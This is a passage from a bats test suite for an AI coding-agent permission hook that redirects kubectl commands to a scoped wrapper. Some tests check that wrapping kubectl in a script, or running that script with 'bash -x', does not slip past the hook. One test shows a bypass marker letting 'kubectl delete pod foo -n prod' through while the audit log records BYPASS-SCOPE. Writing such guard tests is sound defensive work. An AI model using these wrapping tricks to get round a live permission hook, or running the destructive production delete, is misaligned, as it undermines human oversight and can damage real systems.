    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "gdd-practice"
    printf '#!/bin/bash\nkubectl run script-test --image=pause --restart=Never -n gdd-practice\n' > "$WORK/chapter4-script-test.sh"
    chmod +x "$WORK/chapter4-script-test.sh"
    run_hook_with_session './chapter4-script-test.sh' "sk8s" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}
@test "scoped-redirect: bash options do not hide kubectl-run script path" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "gdd-practice"
    printf '#!/bin/bash\nkubectl run script-test --image=pause --restart=Never -n gdd-practice\n' > "$WORK/chapter4-script-test.sh"
    run_hook_with_session 'bash -x ./chapter4-script-test.sh' "sk8s" "$WORK"
    [ "$status" -eq 0 ]
    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
}

@test "scoped-redirect: matching bypass marker lifts the redirect and audits BYPASS-SCOPE" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    write_bypass_marker "k8s" "sk8s" "practicing"
    run_hook_with_session 'kubectl delete pod foo -n prod' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
    grep -q 'BYPASS-SCOPE \[k8s\]' "$HOME/.claude/hook-audit.log"
}

# ─── Tier 2b: ws k8s scope management NOT denied when scope armed ────
#
# Fix 1 regression guards: once a scope is armed, the hook's Tier 2b arm
# must NOT deny the wrapper's own management subcommands (scope show/clear/set).
# Before the fix, the guard treated `scope` as an unknown write verb, resolved
# it against the practice namespace, and returned BLOCK — causing the hook to
# deny scope management calls after the scope was first armed.

@test "scoped-redirect: ws k8s scope show is NOT denied when scope armed" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s scope show' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "scoped-redirect: ws k8s scope clear is NOT denied when scope armed" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s scope clear' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}

@test "scoped-redirect: ws k8s scope set is NOT denied when scope armed" {
    write_project_hook_rules "$(printf '[scoped-redirect-commands]\nk8s | kubectl* | GDD_K8S_CONTEXT | Use ws k8s\n')"
    seed_k8s_scope "sk8s" "kind-practice" "alice-sandbox"
    run_hook_with_session 'ws k8s scope set --context kind-practice --namespace alice-sandbox' "sk8s"
    [ "$status" -eq 0 ]
    [[ "$output" != *"\"permissionDecision\":\"deny\""* ]]
}
